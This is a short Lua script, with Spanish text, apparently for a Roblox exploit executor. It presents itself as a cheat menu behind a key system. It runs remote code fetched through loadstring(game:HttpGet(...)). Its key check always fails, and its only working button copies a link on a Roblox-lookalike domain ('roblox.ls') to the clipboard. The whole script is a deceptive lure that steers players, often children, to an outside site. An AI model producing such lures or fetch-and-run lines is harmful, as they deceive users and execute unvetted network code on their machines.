-- 🔧 Configuración personalizada
_G.Config = {
    GroupLink = "https://roblox.ls/communities/7995131854/"
}

-- 🔽 Script principal
local OrionLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/weakhoes/Roblox-UI-Libs/refs/heads/main/Orion%20Lib/Orion%20Lib%20Source.lua"))()

local Window = OrionLib:MakeWindow({
    Name = "💀Sript Infernos💀",
    HidePremium = false,
    SaveConfig = true,
    ConfigFolder = "KeySystemConfig",
    IntroEnabled = true,
    IntroText = "Cargando interfaz...",
    IntroIcon = "rbxassetid://88159629854210",
    Icon = "rbxassetid://88159629854210"
})

local KeyTab = Window:MakeTab({
    Name = "Key",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

KeyTab:AddLabel("🔗 Únete a nuestro grupo para obtener la key permanente")
KeyTab:AddLabel("📋 Dale a 'Get Key' para copiar el enlace del grupo")

KeyTab:AddTextbox({
    Name = "Enter Key",
    Default = "",
    TextDisappear = true,
    Callback = function(Value)
        OrionLib:MakeNotification({
            Name = "Key System",
            Content = "Dale a 'Get Key' para copiar el link.",
            Image = "rbxassetid://4483345998",
            Time = 5
        })
    end
})

KeyTab:AddButton({
    Name = "Get Key",
    Callback = function()
        setclipboard(_G.Config.GroupLink)
        OrionLib:MakeNotification({
            Name = "Key System",
            Content = "¡Texto copiado al portapapeles!",
            Image = "rbxassetid://4483345998",
            Time = 5
        })
    end
})

KeyTab:AddButton({
    Name = "Check Key",
    Callback = function()
        OrionLib:MakeNotification({
            Name = "Key System",
            Content = "❌ ERROR: Key inválida o executor no compatible",
            Image = "rbxassetid://4483345998",
            Time = 5
        })
    end
})

OrionLib:Init()
